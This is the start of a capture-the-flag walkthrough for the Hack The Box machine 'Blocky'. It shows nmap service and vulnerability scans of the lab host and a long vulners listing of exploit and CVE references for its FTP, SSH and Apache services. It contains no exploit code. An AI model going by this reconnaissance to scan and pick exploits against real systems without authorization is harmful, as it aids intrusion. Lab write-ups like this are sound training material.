# Blocky Walkthrough

![blocky](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Blocky/blocky.png)

## let's first fast scan our machine 

```console
sudo nmap -F -sV 10.10.10.37
```

### Result

```
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     ProFTPD 1.3.5a 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) 
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## we got 3 port open let's also do a berif scan known as our final scan

```console
sudo nmap -A -O -v --script vuln 10.10.10.37
```

### Result

```
PORT     STATE  SERVICE VERSION 
21/tcp   open   ftp     ProFTPD 1.3.5a 
| vulners:  
|   cpe:/a:proftpd:proftpd:1.3.5a:  
|       SAINT:FD1752E124A72FD3A26EEB9B315E8382  10.0    https://vulners.com/saint/SAINT:FD1752E124A72FD3A26EEB9B315E8382     *
EXPLOIT* 
|       SAINT:950EB68D408A40399926A4CCAD3CC62E  10.0    https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E     *
EXPLOIT* 
|       SAINT:63FB77B9136D48259E4F0D4CDA35E957  10.0    https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957     *
EXPLOIT* 
|       SAINT:1B08F4664C428B180EEC9617B41D9A2C  10.0    https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C     *
EXPLOIT* 
|       PROFTPD_MOD_COPY        10.0    https://vulners.com/canvas/PROFTPD_MOD_COPY     *EXPLOIT* 
|       PACKETSTORM:162777      10.0    https://vulners.com/packetstorm/PACKETSTORM:162777      *EXPLOIT* 
|       PACKETSTORM:132218      10.0    https://vulners.com/packetstorm/PACKETSTORM:132218      *EXPLOIT* 
|       PACKETSTORM:131567      10.0    https://vulners.com/packetstorm/PACKETSTORM:131567      *EXPLOIT* 
|       PACKETSTORM:131555      10.0    https://vulners.com/packetstorm/PACKETSTORM:131555      *EXPLOIT* 
|       PACKETSTORM:131505      10.0    https://vulners.com/packetstorm/PACKETSTORM:131505      *EXPLOIT* 
|       MSF:EXPLOIT/UNIX/FTP/PROFTPD_MODCOPY_EXEC       10.0    https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/FTP/PROFTPD_MO
DCOPY_EXEC      *EXPLOIT* 
|       EDB-ID:49908    10.0    https://vulners.com/exploitdb/EDB-ID:49908      *EXPLOIT* 
|       CVE-2015-3306   10.0    https://vulners.com/cve/CVE-2015-3306 
|       1337DAY-ID-36298        10.0    https://vulners.com/zdt/1337DAY-ID-36298        *EXPLOIT* 
|       1337DAY-ID-23720        10.0    https://vulners.com/zdt/1337DAY-ID-23720        *EXPLOIT* 
|       1337DAY-ID-23544        10.0    https://vulners.com/zdt/1337DAY-ID-23544        *EXPLOIT* 
|       SSV:61050       5.0     https://vulners.com/seebug/SSV:61050    *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-18217/        5.0     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-18217/ *EXPLO
IT* 
|       CVE-2020-9272   5.0     https://vulners.com/cve/CVE-2020-9272 
|       CVE-2019-19272  5.0     https://vulners.com/cve/CVE-2019-19272 
|       CVE-2019-19271  5.0     https://vulners.com/cve/CVE-2019-19271 
|       CVE-2019-19270  5.0     https://vulners.com/cve/CVE-2019-19270 
|       CVE-2019-18217  5.0     https://vulners.com/cve/CVE-2019-18217 
|       CVE-2016-3125   5.0     https://vulners.com/cve/CVE-2016-3125 
|       CVE-2013-4359   5.0     https://vulners.com/cve/CVE-2013-4359 
|_      CVE-2017-7418   2.1     https://vulners.com/cve/CVE-2017-7418 
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:7.2p2:  
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A
*EXPLOIT* 
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT* 
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29
334297EC0B6A09  *EXPLOIT* 
|       EDB-ID:40888    7.8     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT* 
|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858 
|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515 
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT* 
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT* 
|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009 
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT* 
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT* 
|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012 
|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325 
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT* 
|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010 
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-25017/        5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/     5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CV
E-2019-6111/    *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2019-6111/     *EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/    *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/  *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C8
4C508837551A19  *EXPLOIT* 
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC
9D6DDDD97F9E97  *EXPLOIT* 
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT* 
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT* 
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111 
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT* 
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT* 
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT* 
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT* 
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT* 
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BD
BD274FD222226F  *EXPLOIT* 
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A2
7A441281EAD138  *EXPLOIT* 
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396
911926B4C3B330  *EXPLOIT* 
|       EDB-ID:40858    5.5     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT* 
|       EDB-ID:40119    5.5     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT* 
|       EDB-ID:39569    5.5     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT* 
|       CVE-2016-3115   5.5     https://vulners.com/cve/CVE-2016-3115 
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT* 
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS
*EXPLOIT* 
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3
C649B764E13FB0  *EXPLOIT* 
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648
B4D14B75563283  *EXPLOIT* 
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT* 
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT* 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708 
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT* 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5
F09C7F2B27C6DF  *EXPLOIT* 
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19A
C0DC1CD97BA3EF  *EXPLOIT* 
|       EDB-ID:40136    4.3     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT* 
|       EDB-ID:40113    4.3     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210 
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT* 
|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT* 
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110 
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109 
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685 
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT* 
|       CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011 
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT* 
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT* 
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT* 
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS/        0.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_E
NUMUSERS/       *EXPLOIT* 
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT* 
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu)) 
| vulners:  
|   cpe:/a:apache:http_server:2.4.18:  
|       E899CC4B-A3FD-5288-BB62-A4201F93FDCC    10.0    https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC
*EXPLOIT* 
|       5DE1B404-0368-5986-856A-306EA0FE0C09    10.0    https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09
*EXPLOIT* 
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943 
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790 
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275 
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679 
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668 
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169 
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/      7.2     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0211/     *EXPLOIT* 
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4
259C41D8BDA0AB  *EXPLOIT* 
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT* 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211 
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15715/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/   *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8
*EXPLOIT* 
|       CVE-2022-22721  6.8     https://vulners.com/cve/CVE-2022-22721 
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438 
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715 
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2
*EXPLOIT* 
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332
*EXPLOIT* 
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224 
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082 
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0217/     *EXPLOIT* 
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927 
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098 
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT* 
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387 
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/    *
EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-1934/      *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/     5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15710/    *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-8743/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/        5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15710/       *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APAC
HE_OPTIONSBLEED *EXPLOIT* 
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0
405CB0AA9C075D  *EXPLOIT* 
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D6
89921651A30355  *EXPLOIT* 
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT* 
|       EDB-ID:40909    5.0     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT* 
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719 
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798 
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193 
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690 
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934 
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567 
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220 
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196 
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199 
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189 
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333 
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303 
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798 
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710 
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743 
|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740 
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979 
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/       4.9     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-0197/      *EXPLOIT* 
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197 
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/     *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2016-4975/      *EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/    *
EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11985/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
19-10092/       *EXPLOIT* 
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985 
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092 
